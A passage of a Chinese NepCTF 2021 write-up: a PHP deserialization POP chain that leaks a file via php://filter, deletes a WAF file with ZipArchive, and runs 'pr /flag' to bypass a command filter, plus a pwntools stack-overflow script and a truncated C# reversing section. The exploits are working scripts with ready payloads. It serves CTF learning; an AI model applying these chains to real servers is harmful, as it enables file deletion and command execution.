variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">choice</span><span class="token operator">-></span><span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>看到<code>__wakeup</code>第一反应可不可以直接绕，看了下版本<code>PHP/7.0.33</code></p><blockquote><p>CVE-2016-7124反序列化绕过wakeup漏洞。<br>影响版本：PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10</p></blockquote><p>乖乖走<code>__wakeup</code>，register类没有作用，看来得走login类</p><p>参数<code>register</code>的md5要为<code>21232f297a57a5a743894a0e4a801fc3</code>，一查，<code>admin</code></p><p>那就没问题了，<code>__wakeup</code>将Game类的<code>file</code>&#x2F;<code>filename</code>&#x2F;<code>content</code>传入login，利用login的<code>__construct</code>赋值</p><p>Game类的变量choice即login类，利用Game类<code>__destruct</code>触发login类的checking函数</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">login</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token operator">=</span><span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'login success you can to open shell file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>login类的checking函数检查赋值的username和password，即Game类传过来的username和password。然后调用file即Game类的file的open函数。由于没有<code>__call</code>之类的魔术方法，不需要考虑其他。即本题所有变量都可在Game类直接赋值。</p><p>关键点就在于Open类了</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Open</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'waf.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><img src="/article/Nepctf2021/image-20210322160046909.png" class="" title="test" loading="lazy"><p>如图所示，存在waf.txt，<code>file_get_contents</code>为true，即存在waf.txt时会<code>file_get_contents($filename.&quot;.php&quot;);</code>，否则会<code>shell($content);</code>所以我们首先要利用伪协议读取<code>shell.php</code>的内容。</p><p>exp1.php如下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Game</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span>  <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$choice</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$register</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$content</span><span class="token punctuation">;</span><span class="token comment">//    public function __construct()</span><span class="token comment">//    &#123;</span><span class="token comment">//        $this->username='user';</span><span class="token comment">//        $this->password='user';</span><span class="token comment">//    &#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">register</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"21232f297a57a5a743894a0e4a801fc3"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">choice</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">choice</span><span class="token operator">-></span><span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">login</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token operator">=</span><span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'login success you can to open shell file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">register</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'success register admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'please register admin '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Open</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'waf.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">register</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'php://filter/convert.base64-encode/resource=shell'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 目录下必须有 shell.php waf.txt</span></span></code></pre><p>得到payload</p><pre class="language-php" data-language="php"><code class="language-php">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6NDk6InBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9c2hlbGwiO3M6NzoiY29udGVudCI7czowOiIiO30<span class="token operator">=</span></code></pre><img src="/article/Nepctf2021/image-20210322161745412.png" class="" title="image-20210322161745412" loading="lazy"><p>读取到<code>shell.php</code>内容</p><pre class="language-php" data-language="php"><code class="language-php">// shell.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">shell</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/'</span><span class="token punctuation">,</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NO"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'so long!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>就是传入一个命令，过滤一堆读取函数然后长度要小于10并读取flag。</p><p>稍后再研究，那么现在的问题就是进shell函数，然而进shell函数写死了必须要waf.txt不存在。但waf.txt是有的</p><img src="/article/Nepctf2021/image-20210322162252803.png" class="" title="waf" loading="lazy"><p>这就为难我胖虎了，思路至此over了。</p><hr><h5 id="删除waf-txt："><a href="#删除waf-txt：" class="headerlink" title="删除waf.txt："></a>删除waf.txt：</h5><p>寻找大佬博客文章，找到了指引思路的<a href="https://blog.csdn.net/weixin_42444939/article/details/100781890">文章</a>，2019bytectf的一道web题EzCMS，原题要删除&#x2F;覆盖目录下<code>.hatccess</code>，刚好本题的login类有漏洞可寻，php手册里查找open的同名函数，利用<a href="https://www.php.net/manual/zh/ziparchive.open.php">ZipArchive::open</a>，其第二个参数里存在能覆盖指定文件的模式，直接删掉<code>waf.txt</code></p><p>于是准备好了phar文件准备‘远程phar’反序列化，但是phar伪协议是不可以远程的</p><img src="/article/Nepctf2021/image-20210322163503746.png" class="" title="phar" loading="lazy"><p>孩子比较呆，测了有一会。这里受到了那题固有思维的影响，其实并不需要打phar反序列化的，由login类中checking函数<code>$this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content)</code>，直接令Game类的file new一个ZipArchive()，filename即为waf.txt，content为模式<code>ZipArchive::OVERWRITE | ZipArchive::CREATE</code>，也就是9</p><img src="/article/Nepctf2021/image-20210322164126786.png" class="" title="type" loading="lazy"><p>测试如下</p><img src="/article/Nepctf2021/image-20210322164402187.png" class="" title="del" loading="lazy"><p>可见waf.txt成功被删除，exp2如下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token string single-quoted-string">''</span><span class="token string single-quoted-string">'类同上    '</span><span class="token string single-quoted-string">''</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">register</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'waf.txt'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token class-name static-context">ZipArchive</span><span class="token operator">::</span><span class="token class-name">OVERWRITE</span> <span class="token operator">|</span> <span class="token class-name">ZipArchive</span><span class="token operator">::</span><span class="token constant">CREATE</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>得到payload</p><pre class="language-none"><code class="language-none">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7Tzo1OiJsb2dpbiI6Mzp7czo0OiJmaWxlIjtOO3M6ODoiZmlsZW5hbWUiO047czo3OiJjb250ZW50IjtOO31zOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo5O30&#x3D;</code></pre><p>成功删除waf.txt</p><img src="/article/Nepctf2021/image-20210322171241326.png" class="" title="delwaf" loading="lazy"><hr><h5 id="读取flag："><a href="#读取flag：" class="headerlink" title="读取flag："></a>读取flag：</h5><p>ls没过滤，有兴趣可以执行ls看一眼，flag在根目录下</p><p>最后一步，分析shell.php，如何在过滤的情况下读取&#x2F;flag，搜一圈，找到了linux的命令<code>pr</code></p><blockquote><p><strong>pr命令</strong> 用来将文本文件转换成适合打印的格式，它可以把较大的文件分割成多个页面进行打印，并为每个页面添加标题。</p></blockquote><img src="/article/Nepctf2021/image-20210322171800805.png" class="" title="pr" loading="lazy"><p>exp3如下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token string single-quoted-string">''</span><span class="token string single-quoted-string">'  类同上  '</span><span class="token string single-quoted-string">''</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">register</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'waf.txt'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'pr /flag'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>得到payload</p><pre class="language-none"><code class="language-none">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6Nzoid2FmLnR4dCI7czo3OiJjb250ZW50IjtzOjg6InByIC9mbGFnIjt9</code></pre><p>拿到flag</p><img src="/article/Nepctf2021/image-20210322173545249.png" class="" title="flag" loading="lazy"><p>记录一下，获取类函数名的方法</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$classes</span> <span class="token operator">=</span> <span class="token function">get_declared_classes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$classes</span> <span class="token keyword">as</span> <span class="token variable">$class</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$methods</span> <span class="token operator">=</span> <span class="token function">get_class_methods</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$methods</span> <span class="token keyword">as</span> <span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string single-quoted-string">'__destruct'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__wakeup'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__call'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__callStatic'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'open'</span>        <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">print</span> <span class="token variable">$class</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'::'</span> <span class="token operator">.</span> <span class="token variable">$method</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><hr><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="xhh"><a href="#xhh" class="headerlink" title="xhh"></a>xhh</h3><img src="/article/Nepctf2021/20210322132920.png" class="" width="20210322132920" loading="lazy"><p>栈溢出，填充0x10，然后找到system cat flag函数，据地址随机化后字节不变，小端更改地址，当图片刷到小蝌蚪的图案便getshell</p><p>exp:</p><pre class="language-none"><code class="language-none">from pwn import *context.arch &#x3D; &#39;amd64&#39;context.log_level&#x3D;&#39;debug&#39;#p &#x3D; process(&#39;.&#x2F;xhh&#39;)p &#x3D; remote(&#39;node2.hackingfor.fun&#39;,35402 )#p &#x3D; remote(&#39;127.0.0.1&#39;,12345)payload &#x3D; p64(0) + p64(1) + b&quot;\xE1&quot;p.send(payload)p.interactive()</code></pre><hr><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="hardcsharp"><a href="#hardcsharp" class="headerlink" title="hardcsharp"></a>hardcsharp</h3><pre class="language-c#" data-language="c#"><code class="language-c#">private static void Main(string[] args)&#123;    AesClass class2 &#x3D; new AesClass();    string key &#x3D; &quot;&quot;;    string strB &#x3D; &quot;1Umgm5LG6lNPyRCd0LktJhJtyBN7ivpq+EKGmTAcXUM+0ikYZL4h4QTHGqH&#x2F;3Wh0&quot;;    byte[] buffer &#x3D; new byte[] &#123;         0x51, 0x52, 0x57, 0x51, 0x52, 0x57, 0x44, 0x5c, 0x5e, 0x56, 0x5d, 0x12, 0x12, 0x12, 0x12, 0x12,        0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12    &#125;;    Console.WriteLine(&quot;Welcome to nepnep csharp test! plz input the magical code:&quot;);    string str &#x3D; Console.ReadLine();    if (str.Length !&#x3D; 0x25)    &#123;        Console.WriteLine(&quot;Nope!&quot;);        Console.ReadKey();    &#125;    else if ((str.Substring(0, 4) !&#x3D; &quot;Nep&#123;&quot;) || 